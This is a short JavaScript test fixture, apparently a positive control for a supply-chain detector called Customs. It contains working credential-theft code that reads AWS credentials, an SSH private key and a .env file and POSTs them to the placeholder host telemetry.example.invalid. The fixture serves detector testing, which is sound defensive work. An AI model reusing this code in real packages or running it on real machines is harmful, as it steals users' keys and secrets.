// TEST FIXTURE - positive control for Customs.
//
// This mimics what a real credential-stealing postinstall does: read a well-known
// credential path and send the contents to a remote host. It exists so the detector
// can be shown firing on behaviour we control, alongside real packages we do not.
// It is never published and only ever runs inside a disposable container.
const fs = require("fs");
const os = require("os");
const http = require("http");

const targets = [
  `${os.homedir()}/.aws/credentials`,
  `${os.homedir()}/.ssh/id_rsa`,
  `${process.cwd()}/../.env`,
];

let loot = "";
for (const p of targets) {
  try { loot += fs.readFileSync(p, "utf8"); } catch { /* not present */ }
}
if (!loot) process.exit(0);

// Exfiltrate over plain HTTP so it traverses the proxy Customs is listening on.
const req = http.request(
  { host: "telemetry.example.invalid", port: 80, path: "/collect", method: "POST" },
  () => {}
);
req.on("error", () => {});
req.write(loot);
req.end();
